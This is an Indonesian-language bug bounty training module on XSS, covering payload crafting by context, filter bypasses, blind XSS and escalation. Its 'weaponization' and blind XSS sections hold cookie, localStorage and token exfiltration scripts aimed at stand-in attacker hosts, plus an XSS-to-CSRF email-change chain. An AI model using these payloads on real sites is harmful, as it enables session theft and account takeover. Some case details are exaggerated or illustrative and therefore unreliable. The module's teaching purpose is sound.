# Sesi 08 — XSS & HTML Injection Mastery

> **Level:** Intermediate  
> **Durasi Estimasi:** 5–6 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP Fundamentals)  
> **Tools:** Burp Suite, XSS Hunter / Interactsh, Browser DevTools

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Membedakan Reflected, Stored, DOM-based, dan Blind XSS
- Membuat payload XSS berdasarkan konteks injection (HTML, attribute, JS)
- Melakukan bypass filter dasar (encoding, event handler alternatif)
- Setup dan menggunakan XSS Hunter untuk Blind XSS
- Weaponize XSS untuk session hijacking dan ATO
- Membuat PoC XSS yang convincing untuk bug bounty report

---

## 📚 Bagian 1 — Memahami XSS dari Perspektif Bug Hunter

### 1.1 Mengapa XSS Masih Relevan?

XSS (Cross-Site Scripting) adalah injeksi JavaScript berbahaya ke halaman web yang dieksekusi di browser korban. Meskipun sudah dikenal lama, XSS **tetap menjadi vulnerability #1 berdasarkan frekuensi** di bug bounty karena:

- Setiap input yang di-render ke HTML adalah potential sink
- Framework modern (React, Vue) mencegah banyak kasus, tapi **developer override** masih terjadi
- DOM-based XSS sering tidak tertangkap oleh WAF
- Blind XSS di internal tools memberikan nilai bounty tinggi

### 1.2 Alur Kerja XSS

```
REFLECTED XSS:
Attacker → Craft URL → Korban klik link → Browser execute JS

STORED XSS:
Attacker → Input ke server → Server simpan → Korban buka halaman → Browser execute JS

DOM-BASED XSS:
Browser process URL/data → JS berbahaya di-execute tanpa ke server

BLIND XSS:
Attacker → Input ke form → Admin/internal system buka data → Execute JS → Callback ke attacker
```

---

## 📚 Bagian 2 — Reflected XSS

### 2.1 Identifikasi Reflection Points

```
Target: Parameter yang di-render kembali ke halaman

Lokasi umum:
- Search: /search?q=FUZZ
- Error messages: /login?error=FUZZ
- Redirect parameters: /redirect?url=FUZZ
- Custom messages: /message?text=FUZZ
- User input di breadcrumb: /profile/FUZZ
```

### 2.2 Deteksi Dasar

```http
# Step 1: Masukkan string unik
GET /search?q=xss_test_12345 HTTP/1.1

# Step 2: Cek apakah muncul di response
# Cari "xss_test_12345" di HTML response

# Step 3: Jika ada, coba karakter khusus
GET /search?q=<>"'/\`;
```

### 2.3 Payload Dasar

```javascript
// Basic test — apakah bisa masuk tag?
<script>alert(1)</script>

// Jika script diblock, gunakan event handler
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// Jika dalam attribute
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)

// Confirm origin untuk PoC
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
```

---

## 📚 Bagian 3 — Stored XSS

### 3.1 Lokasi Penyimpanan

```
High-value stored XSS locations:
- Profile name / bio / username
- Comment/review/forum post
- Order notes / shipping address
- Support ticket title
- Product description (admin panel)
- Notification messages
- File name saat upload
- Custom webhook URL / callback URL
```

### 3.2 Cara Test Stored XSS

```
1. Temukan form yang data-nya disimpan dan ditampilkan ke user lain
2. Input payload di setiap field
3. Lihat bagaimana data di-render di halaman output
4. Perhatikan apakah:
   - Data dirender langsung (innerHTML, dangerouslySetInnerHTML)
   - Data di-encode dengan benar (& < > " ')
   - Data di-sanitize (tapi apakah sanitasinya cukup?)
```

### 3.3 Stored XSS di Name/Profile

```
Nama: <script>fetch('https://attacker.com/c?c='+document.cookie)</script>

Saat admin melihat user list:
  - Admin buka /admin/users
  - Nama ditampilkan tanpa encoding
  - JavaScript berjalan di browser admin
  - Cookie admin dikirim ke attacker
  → FULL ADMIN TAKEOVER
```

---

## 📚 Bagian 4 — DOM-Based XSS

### 4.1 Sources dan Sinks

**Sources (input yang dikontrol attacker):**
```javascript
location.href          // URL lengkap
location.search        // Query string (?q=...)
location.hash          // Fragment (#...)
location.pathname      // Path
document.referrer      // Halaman sebelumnya
window.name            // Tab name
document.cookie        // Cookie (jika tidak HttpOnly)
```

**Sinks (fungsi berbahaya yang mengeksekusi JS):**
```javascript
// Sinks kritis — bisa execute JS langsung
innerHTML = "<user input>"      // BERBAHAYA
outerHTML = "<user input>"      // BERBAHAYA
document.write("<user input>")  // BERBAHAYA
eval("<user input>")            // BERBAHAYA
setTimeout("<user input>", 0)   // BERBAHAYA jika string, bukan function

// Sinks medium — bisa inject HTML
insertAdjacentHTML("...", input)
```

### 4.2 Trace DOM XSS Manual

```javascript
// Contoh kode rentan
var search = location.search.substring(1);
var query = decodeURIComponent(search.split('=')[1]);
document.getElementById('result').innerHTML = 'Search results for: ' + query;

// Exploit:
// https://target.com/search?q=<img src=x onerror=alert(1)>
```

### 4.3 DOM Invader (Burp Suite Pro)

```
Burp Suite Pro → Dashboard → DOM Invader

Tools: 
- Automatically traces data flow dari source ke sink
- Highlights vulnerable patterns
- Suggests payloads

Manual alternative:
1. Buka DevTools → Console
2. Set breakpoint pada sinks (innerHTML, eval, etc.)
3. Trigger input → trace stack
```

---

## 📚 Bagian 5 — Blind XSS

### 5.1 Mengapa Blind XSS Bernilai Tinggi?

Blind XSS terjadi ketika payload **tidak langsung tereksekusi di browser attacker**, melainkan **di browser admin/internal user** yang membuka data tersebut.

```
Alur:
1. Bug hunter input payload di: contact form, support ticket, 
   audit log, user profile, product review
2. Data disimpan di database
3. Ketika ADMIN membuka dashboard/panel dan melihat data tersebut
4. Payload dieksekusi di browser ADMIN
5. Admin session/cookie dikirim ke attacker
6. Attacker dapat ADMIN ACCESS
```

### 5.2 Setup XSS Hunter

```bash
# Option 1: XSS Hunter (self-hosted)
git clone https://github.com/mandatoryprogrammer/xsshunter-express
cd xsshunter-express
docker-compose up

# Option 2: Interactsh (lebih ringan)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client

# Option 3: Bxss.me (web-based, gratis)
# https://xss.report/

# Option 4: CanaryTokens
# https://canarytokens.org/
```

### 5.3 Payload Blind XSS

```javascript
// XSS Hunter payload — capture screenshot, cookies, DOM
"><script src=https://your.xss.ht></script>

// Manual fetch payload — kirim info ke server kita
"><script>
fetch('https://your-server.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: location.href,
    title: document.title,
    localStorage: JSON.stringify(localStorage),
    ua: navigator.userAgent
  })
})
</script>

// Payload compact untuk field dengan karakter terbatas
"><img src=x id=dmFyCmE= onerror=eval(atob(this.id))>
// (payload base64 encoded di id attribute)
```

---

## 📚 Bagian 6 — Context-Based Payload Crafting

### 6.1 XSS di HTML Context

```html
<!-- Input muncul sebagai teks biasa di HTML -->
Halo, [USER_INPUT]!

<!-- Payload -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### 6.2 XSS di HTML Attribute Context

```html
<!-- Input masuk ke dalam attribute -->
<input value="[USER_INPUT]">
<div class="[USER_INPUT]">
<a href="[USER_INPUT]">

<!-- Escape attribute dulu dengan " atau ' -->
" onmouseover="alert(1)" x="
' onmouseover='alert(1)' x='
" autofocus onfocus="alert(1)

<!-- Untuk href/src attribute -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### 6.3 XSS di JavaScript Context

```html
<!-- Input masuk ke dalam blok JS -->
<script>
  var username = "[USER_INPUT]";
  var data = '[USER_INPUT]';
</script>

<!-- Escape dari string dulu -->
";alert(1)//
';alert(1)//
\';alert(1)//

<!-- Jika dalam template literal -->
${alert(1)}
```

### 6.4 XSS di URL Context

```html
<a href="/search?q=[USER_INPUT]">Search</a>

<!-- Payload -->
javascript:alert(document.domain)
```

---

## 📚 Bagian 7 — Filter Bypass

### 7.1 Encoding Bypass

```javascript
// HTML entity encoding
&lt;script&gt;    → terkadang di-decode oleh browser di attribute

// URL encoding
%3Cscript%3E     → < script >
%3cscript%3e     → case insensitive

// Double URL encoding
%253Cscript%253E → %3Cscript%3E → <script>

// Unicode
\u003cscript\u003e  → dalam JS context
<sc\u0072ipt>       → <script> (beberapa renderer)
```

### 7.2 Case Variation

```javascript
// Beberapa WAF case-sensitive
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<ScRiPt/XSS SRC="https://xss.rocks/xss.js"></ScRiPt>
```

### 7.3 Alternatif Event Handler

```javascript
// Jika onerror diblock:
onload, onfocus, onmouseover, onmouseenter, onmouseout
onclick, onkeypress, ontouchstart, onpointerover
onanimationend, ontransitionend

// Jika script diblock, coba:
<details open ontoggle=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### 7.4 Bypass Filter dengan Fragmentation

```javascript
// Beberapa WAF scan "alert" sebagai kata kunci
// Bypass via string concatenation
window['al'+'ert'](1)
window['\x61\x6c\x65\x72\x74'](1)

// Via constructor
[].constructor.constructor('alert(1)')()
```

---

## 📚 Bagian 8 — Weaponization untuk Bug Bounty

### 8.1 Cookie Stealing (jika tidak HttpOnly)

```javascript
// Basic cookie theft
<script>
document.location='https://attacker.com/c?'+document.cookie
</script>

// Silent fetch (tidak redirect)
<script>
new Image().src='https://attacker.com/c?'+encodeURIComponent(document.cookie)
</script>
```

### 8.2 Session Token dari localStorage

```javascript
// Banyak SPA menyimpan JWT di localStorage
<script>
fetch('https://attacker.com/collect?token='+
  encodeURIComponent(localStorage.getItem('token')||localStorage.getItem('auth_token')||
  localStorage.getItem('jwt'))
)
</script>
```

### 8.3 XSS ke CSRF untuk ATO

```javascript
// Gunakan XSS untuk bypass CSRF protection
// karena request datang dari domain korban sendiri
<script>
fetch('/api/user/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
}).then(r => r.json()).then(d => {
  new Image().src = 'https://attacker.com/done?r='+JSON.stringify(d)
})
</script>
```

### 8.4 Membuat PoC yang Convincing untuk Report

```javascript
// PoC yang baik membuktikan impact, bukan hanya alert(1)
// Tampilkan popup yang menunjukkan eksekusi dari domain target
<script>
alert('XSS Executed on: ' + document.domain + '\nURL: ' + location.href)
</script>

// Atau tampilkan data sensitif yang bisa di-exfiltrate
<script>
var proof = {
  domain: document.domain,
  cookies: document.cookie,
  url: location.href
}
document.body.innerHTML = '<pre style="background:red;color:white;padding:20px">' +
  'XSS PoC by [Your Handle]\n' + JSON.stringify(proof, null, 2) + '</pre>'
</script>
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — Stored XSS di Twitter/TweetDeck (Real — 2014)

> **Platform:** Twitter Bug Bounty  
> **Researcher:** @dergeruhn  
> **Tanggal:** September 2014  
> **Severity:** Critical

**Detail:**
Peneliti menemukan Stored XSS di TweetDeck. Payload disisipkan dalam tweet yang mengandung karakter tertentu yang di-parse secara berbeda oleh TweetDeck.

```javascript
// Tweet yang mengandung XSS
// ♥<script class="xss">$('.xss').parents().eq(1).find('a').eq(1).click();$('[data-action=retweet]').click();alert('XSS in Tweetdeck')</script>♥
```

**Impact:** Worm XSS — setiap user yang melihat tweet tersebut secara otomatis me-retweet dan menyebarkan payload. Dalam beberapa menit, jutaan akun ter-exploit.

**Sumber:** [ZDNet Report](https://www.zdnet.com/article/xss-worm-hits-tweetdeck/) (publik)

---

### Case 2 — Stored XSS di HackerOne Platform Sendiri

> **Platform:** HackerOne (own program)  
> **Researcher:** Jobert Abma  
> **Referensi:** [HackerOne Disclosed](https://hackerone.com/reports/1)  
> **Severity:** High

**Skenario:**
HackerOne menemukan dan melaporkan Stored XSS di platform mereka sendiri melalui field yang di-render sebagai Markdown namun parsing-nya tidak sempurna.

**Pelajaran:** Bahkan platform bug bounty sendiri bisa rentan terhadap XSS — tidak ada yang 100% aman.

---

### Case 3 — DOM XSS di Google Search (Real — Disclosed)

> **Platform:** Google VRP  
> **Referensi:** [Google Security Research Writeups](https://bughunters.google.com/)  
> **Severity:** High

**Skenario (terinspirasi dari pola Google XSS yang sering dilaporkan):**

```javascript
// Google memiliki fitur yang mengambil parameter dari URL
// dan memasukkannya ke dalam context JavaScript tanpa encoding yang tepat

// URL: https://service.google.com/search#q=<payload>
// JavaScript vulnerable code:
var query = location.hash.substring(1); // mengambil dari hash fragment
document.getElementById('query').innerHTML = query; // SINK! innerHTML

// Payload:
// https://service.google.com/search#<img src=x onerror=alert(document.domain)>
```

---

### Case 4 — Blind XSS di Admin Panel Support System

> **Tipe:** Blind XSS via Support Ticket  
> **Inspirasi:** Pola umum dari banyak disclosed H1 reports tentang blind XSS  
> **Severity:** High–Critical

```
Alur:
1. Peneliti buka support/contact form di target.com
2. Di field "Subject" dan "Message", masukkan blind XSS payload:
   "><script src=https://your.xss.ht></script>
3. Submit ticket
4. Beberapa jam kemudian, XSS Hunter menerima callback:
   - URL: https://support-admin.target.com/tickets/view/1234
   - Cookies: admin_session=abc123...
   - Screenshot: halaman admin panel ter-capture
5. Session admin berhasil di-capture
```

**Impact:** Full admin takeover via blind XSS di support ticket system.  
**Severity:** Critical (P1) karena mengarah ke admin access.

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy XSS Labs (Gratis — Paling Komprehensif)
- 🔗 [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
- 🔗 [Stored XSS into HTML context](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
- 🔗 [DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
- 🔗 [All XSS Labs](https://portswigger.net/web-security/cross-site-scripting)

### Lab 2 — TryHackMe
- 🔗 [Cross-site Scripting Room](https://tryhackme.com/room/xss)
- 🔗 [OWASP Top 10 2021 - XSS](https://tryhackme.com/room/owasptop102021)

### Lab 3 — HackTheBox Academy
- 🔗 [Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/details/103)

### Lab 4 — OWASP WebGoat XSS Module
```bash
docker run -p 8080:8080 webgoat/webgoat
# Buka: http://localhost:8080/WebGoat
# Modul: Cross-Site Scripting (XSS)
```

### Lab 5 — XSS Game by Google
- 🔗 [https://xss-game.appspot.com/](https://xss-game.appspot.com/)
- 6 level XSS challenges dari Google

---

## 📋 XSS Testing Checklist

```markdown
## XSS Testing Checklist untuk [TARGET]

### Identifikasi Reflection Points
- [ ] Search fields
- [ ] Error messages
- [ ] User profile fields (nama, bio, username)
- [ ] Comment / review fields
- [ ] URL parameters
- [ ] Form inputs yang di-render kembali
- [ ] HTTP headers yang di-reflect (User-Agent, Referer)

### Test Context
- [ ] HTML context → <script>alert(1)</script>
- [ ] Attribute context → " onmouseover="alert(1)
- [ ] JavaScript context → ";alert(1)//
- [ ] URL context → javascript:alert(1)

### Filter Bypass
- [ ] Case variation (<ScRiPt>)
- [ ] Encoding (HTML entity, URL, Unicode)
- [ ] Alternative event handlers
- [ ] Alternative tags

### Blind XSS
- [ ] Support tickets / contact forms
- [ ] User profile (viewed by admin)
- [ ] Log fields (User-Agent, IP, error messages)
- [ ] Webhook / callback URLs

### Impact Escalation
- [ ] HttpOnly check → cookie theft possible?
- [ ] localStorage token theft
- [ ] CSRF via XSS → email/password change
- [ ] Screenshot dengan domain di PoC
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [XSS Complete Guide](https://portswigger.net/web-security/cross-site-scripting) | Comprehensive XSS guide |
| OWASP | [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | Defense & testing |
| PayloadsAllTheThings | [XSS Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) | Payload collection |
| XSS Cheatsheet | [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | Context-based payloads |
| Brutelogic | [https://brutelogic.com.br/blog/](https://brutelogic.com.br/blog/) | XSS advanced techniques |
| Gareth Heyes | [PortSwigger Research](https://portswigger.net/research/xss) | Cutting-edge XSS research |

---

## 🔑 Key Takeaways

1. **XSS = bukan hanya alert(1)** — nilai bounty ada pada impact: session steal, ATO, CSRF chain
2. **Context menentukan payload** — satu payload tidak cocok untuk semua konteks
3. **Blind XSS sering lebih berharga** — akses admin panel via blind XSS = P1 Critical
4. **HttpOnly = partial protection** — localStorage dan postMessage masih bisa dieksploitasi
5. **PoC harus convincing** — tampilkan `document.domain` dan bukti data yang bisa di-exfiltrate

---

*Sesi berikutnya: **Sesi 06 — Broken Authentication & Session Management***
